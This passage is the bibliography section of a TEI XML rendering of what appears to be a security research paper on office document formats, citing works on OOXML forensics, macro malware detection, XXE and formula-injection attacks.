</biblStruct>

<biblStruct xml:id="b27">
	<monogr>
		<title level="m" type="main">HTTP Authentication: Basic and Digest Access Authentication</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Franks</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">P</forename><surname>Hallam-Baker</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Hostetler</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">S</forename><surname>Lawrence</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">P</forename><surname>Leach</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">A</forename><surname>Luotonen</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">L</forename><surname>Stewart</surname></persName>
		</author>
		<imprint>
			<date type="published" when="1999-06" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b28">
	<analytic>
		<title level="a" type="main">Forensic Investigation of OOXML Format Documents</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Z</forename><surname>Fu</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">X</forename><surname>Sun</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Y</forename><surname>Liu</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">B</forename><surname>Li</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">Digital Investigation</title>
		<imprint>
			<date type="published" when="2011" />
			<biblScope unit="volume">8</biblScope>
			<biblScope unit="page" from="48" to="55" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b29">
	<monogr>
		<title level="m" type="main">Macro Malware: Dissecting a Malicious Word Document</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Gajek</surname></persName>
		</author>
		<imprint>
			<date type="published" when="2017" />
			<biblScope unit="page" from="8" to="13" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b30">
	<analytic>
		<title level="a" type="main">Melissa Virus Creates a New Type of Threat</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">L</forename><surname>Garber</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="j">Computer</title>
		<imprint>
			<biblScope unit="volume">32</biblScope>
			<biblScope unit="issue">6</biblScope>
			<biblScope unit="page" from="16" to="19" />
			<date type="published" when="1999" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b31">
	<analytic>
		<title level="a" type="main">Leaking Sensitive Information in Complex Document Files-and How to Prevent It</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">S</forename><surname>Garfinkel</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="j">IEEE Security &amp; Privacy Magazine</title>
		<imprint>
			<biblScope unit="volume">12</biblScope>
			<biblScope unit="issue">1</biblScope>
			<biblScope unit="page" from="20" to="27" />
			<date type="published" when="2013" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b32">
	<analytic>
		<title level="a" type="main">New XML-based Files Implications for Forensics</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">S</forename><surname>Garfinkel</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Migletz</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">IEEE Symposium on Security and Privacy (S&amp;P)</title>
		<imprint>
			<date type="published" when="2009" />
			<biblScope unit="volume">7</biblScope>
			<biblScope unit="page" from="38" to="44" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b33">
	<analytic>
		<title level="a" type="main">How to Break Microsoft Rights Management Services</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">M</forename><surname>Grothe</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">C</forename><surname>Mainka</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">P</forename><surname>Rösler</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Schwenk</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">10th USENIX Workshop on Offensive Technologies (WOOT 16)</title>
		<imprint>
			<date type="published" when="2016" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b34">
	<monogr>
		<title level="m" type="main">The MS Office Magic Show. DerbyCon</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">S</forename><surname>Hegt</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">P</forename><surname>Ceelen</surname></persName>
		</author>
		<imprint>
			<date type="published" when="2018" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b35">
	<analytic>
		<title/>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">S</forename><surname>Hegt</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">P</forename><surname>Ceelen</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="j">MS Office in Wonderland. BlackHat Asia</title>
		<imprint>
			<date type="published" when="2019" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b36">
	<analytic>
		<title level="a" type="main">Comparison of wordprocessing document format in OOXML and ODF</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">X</forename><surname>Hou</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">N</forename><surname>Li</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">H</forename><surname>Yang</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Q</forename><surname>Liang</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">Sixth International Conference on Semantics, Knowledge and Grids</title>
		<imprint>
			<date type="published" when="2010" />
			<biblScope unit="page" from="297" to="300" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b37">
	<monogr>
		<title level="m" type="main">Why Crack When You Can Pass The Hash. SANS Institute InfoSec Reading Room</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">C</forename><surname>Hummel</surname></persName>
		</author>
		<imprint>
			<date type="published" when="2009" />
			<biblScope unit="volume">21</biblScope>
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b38">
	<monogr>
		<title level="m" type="main">Comma Separated Vulnerabilities</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Kettle</surname></persName>
		</author>
		<ptr target="https://www.contextis.com/de/blog/comma-separated-vulnerabilities" />
		<imprint>
			<date type="published" when="2014-08" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b39">
	<analytic>
		<title level="a" type="main">Obfuscated VBA Macro Detection Using Machine Learning</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">S</forename><surname>Kim</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">S</forename><surname>Hong</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Oh</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">H</forename><surname>Lee</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">48th Annual IEEE/IFIP International Conference on Dependable Systems and Networks (DSN)</title>
		<imprint>
			<date type="published" when="2018" />
			<biblScope unit="page" from="490" to="501" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b40">
	<monogr>
		<title level="m" type="main">CVE-2018-6871: LibreOffice Remote Arbitrary File Disclosure</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">M</forename><surname>Klementev</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">R</forename><surname>Goodrich</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">A</forename><surname>Krasichkov</surname></persName>
		</author>
		<imprint>
			<date type="published" when="2018-02" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b41">
	<analytic>
		<title level="a" type="main">OpenDocument and Open XML Security (OpenOffice.org and MS Office 2007)</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">P</forename><surname>Lagadec</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="j">Journal in Computer Virology</title>
		<imprint>
			<biblScope unit="volume">4</biblScope>
			<biblScope unit="issue">2</biblScope>
			<biblScope unit="page" from="115" to="125" />
			<date type="published" when="2008" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b42">
	<analytic>
		<title level="a" type="main">Advanced VBA Macros Attack &amp; Defence</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">P</forename><surname>Lagadec</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="j">BlackHat EU</title>
		<imprint>
			<date type="published" when="2019" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b43">
	<monogr>
		<title level="m" type="main">ODF/OOXML Technical White Paper. Free Software Magazine, 30</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Edward</forename><surname>Macnaghten</surname></persName>
		</author>
		<imprint>
			<date type="published" when="2007" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b44">
	<analytic>
		<title level="a" type="main">Polyglots: Crossing Origins by Crossing Formats</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Magazinius</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">B</forename><surname>Rios</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">A</forename><surname>Sabelfeld</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">Proceedings of the 20th ACM Conference on Computer &amp; Communications Security (CCS)</title>
		<meeting>the 20th ACM Conference on Computer &amp; Communications Security (CCS)</meeting>
		<imprint>
			<date type="published" when="2013" />
			<biblScope unit="page" from="753" to="764" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b45">
	<analytic>
		<title level="a" type="main">PDF Mirage: Content Masking Attack Against Information-Based Online Services</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">I</forename><surname>Markwood</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">D</forename><surname>Shen</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Y</forename><surname>Liu</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Z</forename><surname>Lu</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">26th USENIX Security Symposium</title>
		<imprint>
			<date type="published" when="2017" />
			<biblScope unit="page" from="833" to="847" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b46">
	<monogr>
		<title level="m" type="main">Divide and Conquer: Cracking MS-CHAPv2 with a 100% Success Rate</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">M</forename><surname>Marlinspike</surname></persName>
		</author>
		<ptr target="https://web.archive.org/web/20130328084206/https://www.cloudcracker.com/blog/2012/07/29/cracking-ms-chap-v2/" />
		<imprint>
			<date type="published" when="2012" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b47">
	<monogr>
				<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Marsh</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">D</forename><surname>Orchard</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><surname>Veillard</surname></persName>
		</author>
		<title level="m">XML Inclusions (XInclude) 1.0. W3C Recommendation</title>
		<imprint>
			<date type="published" when="2006" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b48">
	<analytic>
		<title level="a" type="main">Microsoft Corporation</title>
		<ptr target="https://www.microsoft.com/investor/reports/ar16/index.html" />
	</analytic>
	<monogr>
		<title level="j">Annual Report -Shareholder Letter</title>
		<imprint>
			<date type="published" when="2016" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b49">
	<analytic>
		<title level="a" type="main">Detecting Unseen Malicious VBA Macros with NLP Techniques</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">M</forename><surname>Mimura</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">H</forename><surname>Miura</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="j">Journal of Information Processing</title>
		<imprint>
			<biblScope unit="volume">27</biblScope>
			<biblScope unit="page" from="555" to="563" />
			<date type="published" when="2019" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b50">
	<analytic>
		<title level="a" type="main">Towards Efficient Detection of Malicious VBA Macros with LSI</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">M</forename><surname>Mimura</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">T</forename><surname>Ohminami</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">International Workshop on Security</title>
		<imprint>
			<date type="published" when="2019" />
			<biblScope unit="page" from="168" to="185" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b51">
	<analytic>
		<title level="a" type="main">Re: What&apos;s Up Johnny</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Müller</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">M</forename><surname>Brinkmann</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">D</forename><surname>Poddebniak</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">S</forename><surname>Schinzel</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Schwenk</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">International Conference on Applied Cryptography and Network Security</title>
		<imprint>
			<date type="published" when="2019" />
			<biblScope unit="page" from="24" to="42" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b52">
	<analytic>
		<title level="a" type="main">PostScript Undead: Pwning the Web with a 35 Years Old Language</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Müller</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">V</forename><surname>Mladenov</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">D</forename><surname>Felsch</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Schwenk</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">International Symposium on Research in Attacks, Intrusions, and Defenses</title>
		<imprint>
			<date type="published" when="2018" />
			<biblScope unit="page" from="603" to="622" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b53">
	<analytic>
		<title level="a" type="main">SoK: Exploiting Network Printers</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Müller</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">V</forename><surname>Mladenov</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Somorovsky</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Schwenk</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">IEEE Symposium on Security and Privacy (S&amp;P)</title>
		<imprint>
			<date type="published" when="2017" />
			<biblScope unit="page" from="213" to="230" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b54">
	<analytic>
		<title level="a" type="main">Why Ecma OOXML Cannot be Regarded as a Free/Open Document Standard. Note submitted to the Working Committee</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">G</forename><surname>Nagarjuna</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="j">Board of Indian Standards on WordprocessingXML</title>
		<imprint>
			<biblScope unit="page">16</biblScope>
			<date type="published" when="2007" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b55">
	<monogr>
		<title/>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">N</forename><surname>Ochoa</surname></persName>
		</author>
		<imprint>
			<date type="published" when="2008" />
		</imprint>
	</monogr>
<note type="report_type">Pass-The-Hash Toolkit-Docs &amp; Info</note>
</biblStruct>

<biblStruct xml:id="b56">
	<analytic>
		<title level="a" type="main">In the Compression Hornet&apos;s Nest: A Security Study of Data Compression in Network Services</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">G</forename><surname>Pellegrino</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">D</forename><surname>Balzarotti</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">S</forename><surname>Winter</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">N</forename><surname>Suri</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">24th USENIX Security Symposium</title>
		<imprint>
			<date type="published" when="2015" />
			<biblScope unit="page" from="801" to="816" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b57">
	<analytic>
		<title level="a" type="main">Uses and Abuses of Server-Side Requests</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">G</forename><surname>Pellegrino</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">O</forename><surname>Catakoglu</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">D</forename><surname>Balzarotti</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">C</forename><surname>Rossow</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">Int. Symposium on Research in Attacks, Intrusions, and Defenses</title>
		<imprint>
			<date type="published" when="2016" />
			<biblScope unit="page" from="393" to="414" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b58">
	<monogr>
		<title level="m" type="main">Data Exfiltration via Formula Injection #Part1</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">A</forename><surname>Prashar</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">B</forename><surname>Gopal</surname></persName>
		</author>
		<ptr target="http://notsosecure.com/data-exfiltration-formula-injection/" />
		<imprint>
			<date type="published" when="2018-05" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b59">
	<analytic>
		<title level="a" type="main">Die Untiefen der neuen XML-basierten Dokumentenformate</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">H</forename><surname>Pöhls</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">L</forename><surname>Westphal</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">Proc. of DFN CERT Workshop Sicherheit in vernetzten Systemen</title>
		<meeting>of DFN CERT Workshop Sicherheit in vernetzten Systemen<address><addrLine>German</addrLine></address></meeting>
		<imprint>
			<date type="published" when="2008" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b60">
	<monogr>
		<title level="m" type="main">Data Hiding and Detection in Office Open XML (OOXML) Documents</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">M</forename><surname>Raffay</surname></persName>
		</author>
		<imprint>
			<date type="published" when="2011" />
			<pubPlace>UOIT</pubPlace>
		</imprint>
	</monogr>
<note type="report_type">PhD thesis</note>
</biblStruct>

<biblStruct xml:id="b61">
	<monogr>
				<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Aaron</forename><forename type="middle">S</forename><surname>Winnt</surname></persName>
		</author>
		<ptr target="https://insecure.org/sploits/winnt.automatic.authentication.html" />
		<title level="m">Win95 Automatic Authentication Vulnerability (Internet Explorer Bug #4)</title>
		<imprint>
			<date type="published" when="1997-03" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b62">
	<monogr>
		<title level="m" type="main">Lost in Translation: Interoperability Issues for Open Standards-ODF and OOXML as Examples</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">R</forename><surname>Shah</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Kesan</surname></persName>
		</author>
		<imprint>
			<date type="published" when="2008" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b63">
	<analytic>
		<title level="a" type="main">SoK: XML Parser Vulnerabilities</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">C</forename><surname>Späth</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">C</forename><surname>Mainka</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">V</forename><surname>Mladenov</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">J</forename><surname>Schwenk</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="m">10th USENIX Workshop on Offensive Technologies (WOOT 16)</title>
		<imprint>
			<date type="published" when="2016" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b64">
	<monogr>
		<title level="m" type="main">XXE (Xml eXternal Entity) Attack</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">Gregory</forename><surname>Steuck</surname></persName>
		</author>
		<ptr target="https://www.securiteam.com/securitynews/6d0100a5pu/" />
		<imprint>
			<date type="published" when="2002-10" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b65">
	<monogr>
		<title level="m" type="main">ODF vs. OOXML: War of the Words</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">A</forename><surname>Updegrove</surname></persName>
		</author>
		<imprint>
			<date type="published" when="2008" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b66">
	<monogr>
		<title level="m" type="main">Exploiting XXE in File Upload Functionality</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">W</forename><surname>Vandevanter</surname></persName>
		</author>
		<imprint>
			<date type="published" when="2015" />
			<pubPlace>Black Hat USA</pubPlace>
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b67">
	<monogr>
		<title level="m" type="main">Tracking Pixel in Microsoft Office Document</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">R</forename><surname>Villarreal</surname></persName>
		</author>
		<ptr target="https://bestestredteam.com/2018/10/02/tracking-pixel-in-microsoft-office-document/" />
		<imprint>
			<date type="published" when="2018-10" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b68">
	<monogr>
		<title level="m" type="main">LibreOffice: A History of Document Freedom</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">D</forename><surname>Watkins</surname></persName>
		</author>
		<ptr target="https://opensource.com/article/18/9/libreoffice-history" />
		<imprint>
			<date type="published" when="2018" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b69">
	<monogr>
		<title level="m" type="main">Information Risk and Security: Preventing and Investigating Workplace Computer Crime</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">E</forename><surname>Wilding</surname></persName>
		</author>
		<imprint>
			<date type="published" when="2017" />
		</imprint>
	</monogr>
</biblStruct>

<biblStruct xml:id="b70">
	<analytic>
		<title level="a" type="main">Strategic Relational Sequences: Microsoft&apos;s Coopetitive Game in the OOXML Standardization Process</title>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">S</forename><surname>Yami</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">H</forename><surname>Chappert</surname></persName>
		</author>
		<author>
			<persName xmlns="http://www.tei-c.org/ns/1.0"><forename type="first">A</forename><surname>Mione</surname></persName>
		</author>
	</analytic>
	<monogr>
		<title level="j">M@n@gement</title>
		<imprint>
			<biblScope unit="volume">18</biblScope>
			<biblScope unit="issue">5</biblScope>
			<date type="published" when="2015" />
		</imprint>
	</monogr>
</biblStruct>

				</listBibl>
			</div>
		</back>
	</text>
</TEI>
